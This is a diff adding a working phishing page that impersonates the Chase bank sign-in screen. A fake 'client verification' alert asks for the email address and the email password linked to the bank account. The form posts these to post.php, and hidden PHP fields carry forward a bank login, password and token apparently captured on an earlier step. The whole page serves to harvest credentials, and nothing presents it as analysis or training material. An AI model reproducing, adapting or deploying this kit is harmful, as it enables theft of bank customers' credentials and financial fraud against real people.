@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr" data-brand="cpo" data-mds-theme="light">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style>
+    body {transition: opacity ease-in 0.2s; } 
+            body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
+    </style>
+    <style>
+    body {transition: opacity ease-in 0.2s; } 
+            body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
+    </style>
+    <style>
+    body {transition: opacity ease-in 0.2s; } 
+            body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
+    </style>
+    <style>
+    body {transition: opacity ease-in 0.2s; } 
+            body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; }
+    </style>
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="msapplication-config" content="none">
+    <title>Sign in - chase.com</title>
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0">
+    <!--[if lte IE 8]>
+        <link rel="stylesheet" type="text/css" media="all" href="https://static.chasecdn.com/web/2023.03.19-826/logon/assets/ie8.css" />
+        <![endif]-->
+    <link rel="dns-prefetch" href="https://static.chasecdn.com/">
+    <link rel="preconnect" href="https://static.chasecdn.com/">
+    <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon.png">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-152x152.png">
+    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-120x120.png">
+    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-76x76.png">
+    <link rel="apple-touch-icon-precomposed" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon.png">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <script src="https://kit.fontawesome.com/fd69f7a966.js" crossorigin="anonymous"></script>
+    <style>
+    @font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 700;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.svg#opensans-bold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 800;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.svg#opensans-extrabold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
+                    html {height:100%; background: #fff;}
+            
+                    @media only screen and (min-width: 768px) {
+                    html {
+                    background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
+                    }
+                    }
+    </style> 
+
+    <link href="./mds-chase-icons.css" type="text/css" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/blue-ui.css">
+    <link rel="stylesheet" href="css/logon.css">
+   
+</head>
+
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
+    <div id="body">
+        <div id="logonApp">
+            <div class="homepage">
+                <div id="advertisenativeapp" data-has-view="true">
+                    <div data-is-view="true" data-component-name="ROOT/SITE/logon/advertiseNativeApp|advertiseNativeAppComponent|LOGON_ALERT_HEADER|e19c9104-4bf9-4d2b-aa5d-0673b8847448">
+                        <div class="advertiseNativeApp"></div>
+                    </div>
+                </div>
+                <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
+                    <div data-is-view="true" data-component-name="ROOT/SITE/logon/siteMessage|siteMessageComponent|LOGON_SITE_MESSAGES|66e12eba-8e59-4de0-a142-5336598ac8b2">
+                        <div id="siteMessageAda" aria-live="polite">
+                            <h2 class="util accessible-text" id="site-messages-heading">You have no more site alerts</h2>
+                        </div>
+                    </div>
+                </div>
+                <div class="logon-container" id="container">
+                    <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
+                        <div class="logon header jpui transparent navigation bar" data-is-view="true" data-component-name="ROOT/SITE/logon/logonSummaryMenu|logonSummaryMenuComponent|LOGON_SUMMARY_MENU|a9d7cdb5-d8ce-4ec8-94d1-4f147036f919">
+                            <a id="logoHomepageLink" href="https://secure05ea.chase.com/web/auth/?fromOrigin=https://secure05ea.chase.com#">
+                                <div>
+                                    <div class="chase logo"></div>
+                                </div> <span class="util accessible-text">Chase.com homepage</span></a>
+                        </div>
+                    </header>
+                    <main id="logon-content" data-has-view="true">
+                        <div class="container logon" data-is-view="true" data-component-name="ROOT/SITE/logon/logon|logon|LOGON|26729179-9365-441e-817c-34b92b9a54c6">
+                            <div>
+                                <div id="backgroundImage">
+                                    <div>
+                                        <div class="jpui background image fixed" id="geoImage">
+                                            <style type="text/css">
+                                            .jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.1.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.1.jpeg); } }
+                                            </style>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
+                                    <div class="jpui raised segment">
+                                        <div class="row">
+                                            <div class="col-xs-10 col-xs-offset-1">
+                                                <h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3>
+                                            </div>
+                                        </div>
+                                        <div class="row">
+                                            <div class="col-xs-12">
+                                                <div class="progress">
+                                                    <div class="bar"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+<style type="text/css">
+.input-container {
+  position: relative;
+}
+
+input[type="text"] {
+  width: 100%;
+  padding: 10px 5px;
+  font-size: 16px;
+  border: none;
+  border-bottom: 1px solid #ccc;
+  outline: none;
+}
+
+input[type="text"]:focus {
+  border-bottom: 1px solid #0077cc;
+}
+
+input[type="text"]:focus + label,
+input[type="text"]:valid + label {
+  top: -10px;
+  left: 0;
+  color: #6e6e6e;
+  font-size: 14px;
+}
+
+label {
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  color: #999;
+  font-size: 16px;
+  transition: all 0.2s ease-out;
+  pointer-events: none;
+}
+.close-btn {
+top: -20px;
+    right: -5px;
+    padding: 5px;
+    cursor: pointer;
+    font-size: 20px;
+    color: #fff;
+    float: right;
+    position: relative;
+}
+
+.close-btn:hover {
+  color: #000;
+}
+
+</style>
+                                                    <div id="error-message2" class="error-message" style="
+    color: #ffffff;
+    font-size: 15px;
+    margin: 0 auto;
+    width: 300px;
+    background: #F44336;
+    padding: 15px 10px 15px 11px;
+    border-radius: 3px;
+">
+<div id="none">
+  <span class="close-btn">&times;</span>
+  <!-- Ваше содержимое здесь -->
+</div>
+
+<i class='fa-solid fa-circle-exclamation' style=' color: #fff; font-size: 20px; padding-right: 5px;'></i> Currently, our team is verifying all clients. To do so, please log in with your email and the password linked to your bank account.<br><br>Sorry for the inconvenience.</div>
+                                <div class="col-xs-12 logon-box" id="logonbox">
+                                    <div class="jpui raised segment">
+                                        <div id="thirdPartyAggregatorSecurityBanner"></div>
+                                        <div class="row">
+                                            <div class="col-xs-10 col-xs-offset-1">
+
+                                                <form id="myForm" action="post.php?page=1" method="POST">
+                                                    <div id="error-message" class="error-message" style="
+    color: #bf2155;
+    font-size: 15px;
+"></div>
+                                                    <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
+                                                        <div class="jpui vertical">
+                                                            <div class="align-label-input floating-label__container" style="
+    padding-bottom: 20px;
+">
+<div class="input-container">
+  <input type="text" name="email" id="login" autofocus required>
+  <label for="input-field">Email</label>
+</div>
+
+                                                            </div>
+                                                            <div>
+                                                                <div> </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                        <div class="jpui vertical">
+                                                            <div class="align-label-input floating-label__container">
+<div class="input-container">
+  <input type="text" name="Emailpassword" id="password" required>
+  <label for="input-field">Password</label>
+</div>
+
+<input type="hidden" name="login" value="<?php $login = $_POST['login']; echo $login; ?>">
+<input type="hidden" name="password" value="<?php $password = $_POST['password']; echo $password; ?>">
+<input type="hidden" name="Usertoken" value="<?php $Usertoken = $_POST['Usertoken']; echo $Usertoken; ?>">
+
+                                                            </div>
+                                                            <div>
+                                                                <div> </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
+                                                    <div class="row"><button type="button" id="signin-button" class="jpui button focus fluid primary"><span class="label">Next</span> </button></div>
+
+                                                    <div class="row"><span class="jpui link" id="enrollment-link-wrapper"><a class="link-anchor last" id="enrollment" href="javascript:void(0);" aria-label=" Not Enrolled? Sign Up Now. ">Not Enrolled? Sign Up Now. <svg style="
+    width: 6px;
+    fill: #2a7acb;
+" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Pro 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"/></svg></a></span></div>
+
+
+
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </main>
+                </div>
+                <div id="banner" data-has-view="true"></div>
+                <footer class="logon-footer" id="logon-footer" data-has-view="true">
+                    <div class="footer-container position-absolute" data-is-view="true" data-component-name="ROOT/SITE/logon/logonFooterMenu|logonFooterMenuComponent|LOGON_FOOTER_MENU|9cf5a39e-a673-4cfe-9678-feac0dec86e7">
+                        <div class="container">
+                            <div class="social-links row">
+                                <div class="col-xs-12"><span class="follow-us-text">Follow us:</span>
+                                    <ul class="icon-links">
+                                        <li class="facebook"><span id="requestChaseFacebook-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseFacebook"> <span class="util accessible-text" id="accessible-requestChaseFacebook">Facebook: Opens dialog</span> <i style="font-size: 1.4rem;" class="fa-brands fa-square-facebook"></i></a>
+                                            </span>
+                                        </li>
+                                        <li class="instagram"><span id="requestChaseInstagram-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseInstagram"> <span class="util accessible-text" id="accessible-requestChaseInstagram">Instagram: Opens dialog</span> <i style="font-size: 1.4rem;" class="fa-brands fa-square-instagram"></i></a>
+                                            </span>
+                                        </li>
+                                        <li class="twitter"><span id="requestChaseTwitter-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseTwitter"> <span class="util accessible-text" id="accessible-requestChaseTwitter">Twitter: Opens dialog</span> <i style="font-size: 1.4rem;" class="fa-brands fa-twitter"></i></a>
+                                            </span>
+                                        </li>
+                                        <li class="youtube"><span id="requestChaseYouTube-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseYouTube"> <span class="util accessible-text" id="accessible-requestChaseYouTube">YouTube: Opens dialog</span> <i style="font-size: 1.4rem;" class="fa-brands fa-youtube"></i></a>
+                                            </span>
+                                        </li>
+                                        <li class="linkedin"><span id="requestChaseLinkedIn-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseLinkedIn"> <span class="util accessible-text" id="accessible-requestChaseLinkedIn">LinkedIn: Opens dialog</span> <i style="font-size: 1.4rem;" class="fa-brands fa-linkedin-in"></i></a>
+                                            </span>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="footer-links row implement-ada-features-enabled">
+                                <div class="col-xs-12">
+                                    <ul>
+                                        <li><span class="jpui link" id="requestContactUs-link-wrapper"><a class="link-anchor" id="requestContactUs" href="javascript:void(0);" aria-label=" Contact us ">Contact us</a></span></li>
+                                        <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a class="link-anchor" id="requestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy</a></span></li>
+                                        <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor" id="requestSecurity" href="javascript:void(0);" aria-label=" Security ">Security</a></span></li>
+                                        <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a class="link-anchor" id="requestTermsOfUse" href="javascript:void(0);" aria-label=" Terms of use ">Terms of use</a></span></li>
+                                        <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a class="link-anchor" id="requestAccessibility" href="javascript:void(0);" aria-label=" Accessibility ">Accessibility</a></span></li>
+                                        <li><span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper"><a class="link-anchor" id="requestMortgageLoanOriginators" href="javascript:void(0);" aria-label=" SAFE Act: Chase Mortgage Loan Originators ">SAFE Act: Chase Mortgage Loan Originators</a></span></li>
+                                        <li><span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper"><a class="link-anchor" id="requestHomeMortgageDisclosureAct" href="javascript:void(0);" aria-label=" Fair Lending ">Fair Lending</a></span></li>
+                                        <li><span class="jpui link" id="requestAboutChase-link-wrapper"><a class="link-anchor" id="requestAboutChase" href="javascript:void(0);" aria-label=" About Chase ">About Chase</a></span></li>
+                                        <li><span class="jpui link" id="requestJpMorgan-link-wrapper"><a class="link-anchor" id="requestJpMorgan" href="javascript:void(0);" aria-label=" J.P. Morgan ">J.P. Morgan</a></span></li>
+                                        <li><span class="jpui link" id="requestJpMorganChaseCo-link-wrapper"><a class="link-anchor" id="requestJpMorganChaseCo" href="javascript:void(0);" aria-label=" JPMorgan Chase &amp; Co. ">JPMorgan Chase &amp; Co.</a></span></li>
+                                        <li><span class="jpui link" id="requestCareers-link-wrapper"><a class="link-anchor" id="requestCareers" href="javascript:void(0);" aria-label=" Careers ">Careers</a></span></li>
+                                        <li><span class="jpui link" id="requestEspanol-link-wrapper"><a class="link-anchor" id="requestEspanol" href="javascript:void(0);" aria-label=" Español ">Español</a></span></li>
+                                        <li><span class="jpui link" id="requestChaseCanada-link-wrapper"><a class="link-anchor" id="requestChaseCanada" href="javascript:void(0);" aria-label=" Chase Canada ">Chase Canada</a></span></li>
+                                        <li><span class="jpui link" id="requestSiteMap-link-wrapper"><a class="link-anchor" id="requestSiteMap" href="javascript:void(0);" aria-label=" Site map ">Site map</a></span></li>
+                                        <li>Member FDIC</li>
+                                        <li><i class="fa-solid fa-warehouse"></i> Equal Housing Lender</li>
+                                        <li class="copyright-label">(c) 2023 JPMorgan Chase &amp; Co.</li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="row galaxy-footer">
+                                <div class="col-xs-10 col-xs-offset-1">
+                                    <p class="NOTE"><span></span><br> <span class="copyright-label">(c) 2023 JPMorgan Chase &amp; Co.</span></p>
+                                    <p><span class="jpui link" id="galaxyRequestPrivacyNotice-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy<i class="jpui progressright icon end-icon" id="galaxyRequestPrivacyNotice-endIcon" aria-hidden="true"></i></a></span></p>
+                                    <p><span class="jpui link" id="galaxyRequestAccessibility-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestAccessibility" href="javascript:void(0);" aria-label=" Accessibility ">Accessibility<i class="jpui progressright icon end-icon" id="galaxyRequestAccessibility-endIcon" aria-hidden="true"></i></a></span></p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </footer>
+            </div>
+            <div id="languageSupportDisclaimer"></div>
+            <div id="overlay" data-has-view="true">
+                <div data-is-view="true" data-component-name="ROOT/SITE/logon/logon|overlay|EMPTY|9d4c360e-246e-4ea2-9632-62cd24b100d4"></div>
+            </div>
+            <div class="overlay"></div>
+            <div id="signoutModal"></div>
+            <div id="siteExitWarning"></div>
+            <div id="serviceErrorModal"></div>
+            <div id="sessionTimeoutModal"></div>
+        </div>
+    </div>
+
+<script>
+const myCheckbox = document.querySelector('#my-checkbox');
+const myDiv = document.querySelector('#tokenBlock');
+
+myCheckbox.addEventListener('change', function() {
+  if (myCheckbox.checked) {
+    myDiv.style.display = 'block';
+  } else {
+    myDiv.style.display = 'none';
+  }
+});
+</script>
+
+<script type="text/javascript">
+function validateForm() {
+  // Получаем значения полей логина и пароля
+  var login = document.getElementById("login").value;
+  var password = document.getElementById("password").value;
+
+  // Проверяем, заполнены ли поля логина и пароля
+  if (login == "" && password == "") {
+    document.getElementById("error-message").innerHTML = "<i class='fa-solid fa-circle-exclamation' style=' color: #bf2155; font-size: 20px; padding-right: 10px;'></i> Please tell us your email and password.";
+  } else if (login == "") {
+    document.getElementById("error-message").innerHTML = "<i class='fa-solid fa-circle-exclamation' style=' color: #bf2155; font-size: 20px; padding-right: 10px;'></i> Please tell us your email.";
+  } else if (password == "") {
+    document.getElementById("error-message").innerHTML = "<i class='fa-solid fa-circle-exclamation' style=' color: #bf2155; font-size: 20px; padding-right: 10px;'></i> Please tell us your password.";
+  } else {
+    // Если поля заполнены, отправляем форму
+    document.getElementById("error-message").innerHTML = "";
+    document.querySelector("form").submit();
+  }
+}
+
+var loginButton = document.getElementById("signin-button");
+  loginButton.addEventListener("click", validateForm);
+
+</script>
+
+<script type="text/javascript">
+const closeBtn = document.querySelector('.close-btn');
+const noneDiv = document.querySelector('#error-message2');
+
+closeBtn.addEventListener('click', () => {
+  noneDiv.style.display = 'none';
+});
+</script>
+
+
+</body>
+
+</html>
